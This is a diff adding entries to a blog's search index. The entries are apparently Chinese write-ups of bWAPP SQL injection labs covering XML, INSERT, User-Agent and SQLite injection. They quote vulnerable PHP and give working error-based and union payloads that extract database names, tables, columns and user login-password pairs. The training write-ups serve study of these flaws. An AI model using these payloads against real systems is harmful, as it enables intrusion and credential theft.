@@ -1,6 +1,166 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>bWAPP-SQLiXML</title>
+    <url>/2020/09/22/bWAPP-SQLiXML/</url>
+    <content><![CDATA[<h1 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h1><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sqli8-1.php 点击按钮之后调用javascript,跳转到sqli8-2.php</span></span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">ResetSecret</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> xmlHttp;</span><br><span class="line">            <span class="comment">// Code for IE7+, Firefox, Chrome, Opera, Safari</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest)</span><br><span class="line">            &#123;</span><br><span class="line">                xmlHttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Code for IE6, IE5</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                xmlHttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            xmlHttp.open(<span class="string">"POST"</span>,<span class="string">"sqli_8-2.php"</span>,<span class="literal">true</span>);</span><br><span class="line">            xmlHttp.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"text/xml; charset=UTF-8"</span>);</span><br><span class="line">            xmlHttp.send(<span class="string">"&lt;reset&gt;&lt;login&gt;&lt;?php if(isset($_SESSION["</span>login<span class="string">"]))&#123;echo $_SESSION["</span>login<span class="string">"];&#125;?&gt;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sqli8-2.php 接收传递过来的数据</span></span><br><span class="line"><span class="keyword">if</span>($_COOKIE[<span class="string">"security_level"</span>] != <span class="string">"1"</span> &amp;&amp; $_COOKIE[<span class="string">"security_level"</span>] != <span class="string">"2"</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    ini_set(<span class="string">"display_errors"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    $xml = simplexml_load_string($body);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Debugging</span></span><br><span class="line">    <span class="comment">// print_r($xml);</span></span><br><span class="line"></span><br><span class="line">    $login = $xml-&gt;login;</span><br><span class="line">    $secret = $xml-&gt;secret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($login &amp;&amp; $login != <span class="string">""</span> &amp;&amp; $secret)</span><br><span class="line">    &#123;</span><br><span class="line">		</span><br><span class="line">        $sql = <span class="string">"UPDATE users SET secret = '"</span> . $secret . <span class="string">"' WHERE login = '"</span> . $login . <span class="string">"'"</span>;</span><br><span class="line">        <span class="comment">//可对查询语句进行注入，闭合 '</span></span><br><span class="line">        <span class="comment">// Debugging</span></span><br><span class="line">        <span class="comment">// echo $sql;      </span></span><br><span class="line">        $recordset = $link-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$recordset)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Connect Error: "</span> . $link-&gt;error);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $message = $login . <span class="string">"'s secret has been reset!"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><ul>
+<li>爆库</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>1' or extractvalue(null,concat('#',(select database()))) or '<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiXML/image-20200922193435147.png" alt="image-20200922193435147"></p>
+<ul>
+<li>爆表</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>1' or extractvalue(null,concat('#',(select group_concat(table_name) from information_schema.tables where table_schema=database()))) or '<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiXML/image-20200922193717938.png" alt="image-20200922193717938"></p>
+<ul>
+<li><p>爆列</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>1' or extractvalue(null,concat('#',(select group_concat(column_name) from information_schema.columns where table_name="users" and table_schema=database()))) or '<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiXML/image-20200922194134054.png" alt="image-20200922194134054"></p>
+</li>
+<li><p>获取信息</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>1' or extractvalue(null,concat(0x7e,(select group_concat(login,'-',password) from users ))) or '<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiXML/image-20200922202027015.png" alt="image-20200922202027015"></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>1' or extractvalue(null,concat(0x7e,substring((select group_concat(login,'-',password) from users),49,81))) or '<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiXML/image-20200922202017200.png" alt="image-20200922202017200"></p>
+</li>
+</ul>
+<h1 id="extractvalue-用法"><a href="#extractvalue-用法" class="headerlink" title="extractvalue()用法"></a>extractvalue()用法</h1><p>mysql 5.1以后推出了xml的解析支持</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> extractValue(<span class="string">'&lt;a href="sss"&gt;&lt;/a&gt;&lt;a href="2333"&gt;&lt;/a&gt;'</span>,<span class="string">'/a/attribute::href'</span>) <span class="keyword">body</span> <span class="keyword">FROM</span> <span class="string">`casexml`</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="函数解释"><a href="#函数解释" class="headerlink" title="函数解释"></a>函数解释</h2><p>　　extractvalue()：从目标XML中返回包含所查询值的字符串。<br>　　EXTRACTVALUE (XML_document, XPath_string);<br>　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>　　第二个参数：XPath_string (Xpath格式的字符串)</p>
+<p><strong>第二个参数 xml中的位置是可操作的地方</strong>，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，<strong>并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容</strong></p>
+<p>正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--正常查询，无报错</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="literal">null</span>,<span class="string">'/x/xx'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">--非正常查询</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="literal">null</span>,<span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()))))</span><br><span class="line"></span><br><span class="line"><span class="comment">--结果 为执行database()函数并返回数据库名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--其中 concat的第一个参数为 ~的目的是因为以~开头的内容不是正确的xml命名规则的语法,所以导致报错，从而执行database()</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#XML元素的命名规则</span></span><br><span class="line">1、元素的名字可以包含字母、数字、和其他字符</span><br><span class="line"></span><br><span class="line">2、元素的名字不能以xml（XML、Xml、xML等）开头</span><br><span class="line"></span><br><span class="line">3、元素的名字不能以数字或者标点符号开头</span><br><span class="line"></span><br><span class="line">4、元素的名字不能包含空格</span><br><span class="line"></span><br><span class="line">5、XML文档除了XML以外，没有其他所谓的保留字，任何的名字都可以使用，但是应该尽量使元素名字具有可读性，名字使用下划线是个不错的选择</span><br><span class="line"></span><br><span class="line">6、尽量避免使用<span class="string">"-"</span>和<span class="string">"."</span>，因为可能引起混乱。</span><br><span class="line"></span><br><span class="line">7、在XML元素命名中不要使用”:”,因为XML命名空间需要用到这个十分特殊的字符。</span><br></pre></td></tr></table></figure>
+
+<h1 id="updatexml-用法"><a href="#updatexml-用法" class="headerlink" title="updatexml()用法"></a>updatexml()用法</h1><h2 id="函数解释-1"><a href="#函数解释-1" class="headerlink" title="函数解释"></a>函数解释</h2><p>updatexml(XML_document, XPath_string, string)</p>
+<p>​                        目标xml文档，xml路径，更新的内容</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="string">'anything'</span>,<span class="string">'/xx/xx'</span>,<span class="string">'anything'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="string">'anything'</span>,<span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="string">'anything'</span>))</span><br></pre></td></tr></table></figure>
+
+<p>需要注意，extractvalue()和updatexml()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="literal">null</span>,<span class="keyword">concat</span>(<span class="string">'~'</span>,<span class="keyword">substring</span>(<span class="keyword">hex</span>((<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>,<span class="number">5</span>))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.user <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="string">'anything'</span>,<span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="string">'anything'</span>))</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036" target="_blank" rel="noopener">extractvalue()/updatexml()</a></p>
+<p><a href="https://www.jianshu.com/p/361a2cb6d3e5" target="_blank" rel="noopener">XML语法</a></p>
+<p><a href="https://www.w3school.com.cn/dtd/index.asp" target="_blank" rel="noopener">DTD</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>bWAPP-SQLiInsert</title>
+    <url>/2020/09/22/bWAPP-SQLiInsert/</url>
+    <content><![CDATA[<h1 id="SQL-Insert注入"><a href="#SQL-Insert注入" class="headerlink" title="SQL Insert注入"></a>SQL Insert注入</h1><h2 id="bwapp-bolg"><a href="#bwapp-bolg" class="headerlink" title="bwapp-bolg"></a>bwapp-bolg</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$entry = sqli($_POST[<span class="string">"entry"</span>]);</span><br><span class="line">$owner = $_SESSION[<span class="string">"login"</span>];</span><br><span class="line">$sql = <span class="string">"INSERT INTO blog (date, entry, owner) VALUES (now(),'"</span> . $entry . <span class="string">"','"</span> . $owner . <span class="string">"')"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//故执行了 insert into blog(date,entry,owner) values(now(), '$entry', 'bee'); sql语句</span></span><br><span class="line"><span class="comment">//所以对（）进行闭合即可</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><ol>
+<li><p>注入判断</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">'</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922153652885.png" alt="image-20200922153652885"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">entry','owner')<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922154017997.png" alt="image-20200922154017997"></p>
+</li>
+<li><p>联合查询</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">entry',(<span class="keyword">select</span> <span class="keyword">database</span>()))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922154216830.png" alt="image-20200922154216830"></p>
+</li>
+<li><p>获取表名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">entry',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922154418666.png" alt="image-20200922154418666"></p>
+</li>
+<li><p>获取列名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">entry',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span> <span class="keyword">and</span> table_schema=<span class="keyword">database</span>()))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922154533356.png" alt="image-20200922154533356"></p>
+</li>
+<li><p>提取信息</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">entry',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922154641987.png" alt="image-20200922154641987"></p>
+<h3 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h3><p>使用 <code>addslashes</code>对输入的特殊字符进行转义（这些字符是单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）。）</p>
+<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922154855945.png" alt="image-20200922154855945"></p>
+</li>
+</ol>
+<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>使用 <code>mysqli_real_escape_string</code>对字符串中的特殊字符进行转义， 以使得这个字符串是一个合法的 SQL 语句</p>
+<h2 id="bwapp–User-Agent"><a href="#bwapp–User-Agent" class="headerlink" title="bwapp–User-Agent"></a>bwapp–User-Agent</h2><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取客户端user_agent，插入数据库并回显</span></span><br><span class="line">$ip_address = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">$user_agent = $_SERVER[<span class="string">"HTTP_USER_AGENT"</span>];</span><br><span class="line"><span class="comment">// Writes the entry into the database</span></span><br><span class="line">$sql = <span class="string">"INSERT INTO visitors (date, user_agent, ip_address) VALUES (now(), '"</span> . sqli($user_agent) . <span class="string">"', '"</span> . $ip_address . <span class="string">"')"</span>;  </span><br><span class="line">$recordset = $link-&gt;query($sql);</span><br></pre></td></tr></table></figure>
+
+<h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922155906295.png" alt="image-20200922155906295"></p>
+<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922155924071.png" alt="image-20200922155924071"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">entry',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922160147861.png" alt="image-20200922160147861"></p>
+<p><img src="/2020/09/22/bWAPP-SQLiInsert/image-20200922160215133.png" alt="image-20200922160215133"></p>
+<h3 id="mid-high"><a href="#mid-high" class="headerlink" title="mid/high"></a>mid/high</h3><p>分别使用了 <code>addslashes（）</code>和 <code>mysqli_real_escape_string（）</code>对数据进行消毒</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>bWAPP--SQLInjectionStore1</title>
+    <url>/2020/09/22/bWAPP-SQLInjectionStore1/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>bWAPP-SQLInjectionSQLite</title>
+    <url>/2020/09/22/bWAPP-SQLInjectionSQLite/</url>
+    <content><![CDATA[<h1 id="SQLlite注入"><a href="#SQLlite注入" class="headerlink" title="SQLlite注入"></a>SQLlite注入</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="常用语句及基本结构"><a href="#常用语句及基本结构" class="headerlink" title="常用语句及基本结构"></a>常用语句及基本结构</h3><p>sqlite因为其比较简易每个db文件就是一个数据库，所以不存在information_schema数据库，但存在类似作用的表<code>sqlite_master</code>。 该表记录了该库下的所有表，索引，表的创建sql等所以我们可以通过此读取数据。</p>
+<p><strong>SQLite含有一张内置表“sqlite_master”,表里存储着type、name、tbl_name、rootpage、sql五个字段。</strong></p>
+<p><strong>type列记录了项目的类型，如table、index、view、trigger</strong></p>
+<p><strong>tbl_name字段记录所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身；</strong></p>
+<p><strong>name字段记录了项目的名称，如表名、索引名等；</strong></p>
+<p><strong>rootpage记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL</strong></p>
+<p><strong>sql存放着所有表的创建语句，即表的结构。</strong></p>
+<p><a href="https://www.cnblogs.com/kagari/p/11631085.html" target="_blank" rel="noopener">SQLite</a></p>
+<h2 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h2><ol>
+<li><p>判断注入点</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' and 1=1 <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<ol start="2">
+<li><p>判断字段数</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' order by 6 <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<ol start="3">
+<li><p>判断字段显示顺序</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆所有表</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,sqlite_version(),<span class="keyword">name</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> sqlite_master <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取字段</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,sqlite_version(),<span class="keyword">sql</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> sqlite_master <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取信息</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,login,<span class="keyword">password</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+</li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
     <title>bWAPP-SQLInjection-LoginForm</title>
     <url>/2020/09/21/bWAPP-SQLInjection-LoginForm/</url>
     <content><![CDATA[<h1 id="表单注入"><a href="#表单注入" class="headerlink" title="表单注入"></a>表单注入</h1><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//==============同时对输入字段进行消毒，查询================</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))   <span class="comment">//===========获取提交的表单信息===============</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $login = $_POST[<span class="string">"login"</span>];</span><br><span class="line">        $login = sqli($login);</span><br><span class="line"></span><br><span class="line">        $password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">        $password = sqli($password);</span><br><span class="line">		<span class="comment">//==================使用自定义的sqli()函数进行消毒================</span></span><br><span class="line">        $sql = <span class="string">"SELECT * FROM heroes WHERE login = '"</span> . $login . <span class="string">"' AND password = '"</span> . $password . <span class="string">"'"</span>;</span><br><span class="line">        <span class="comment">// echo $sql;</span></span><br><span class="line">       $recordset = mysql_query($sql, $link);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
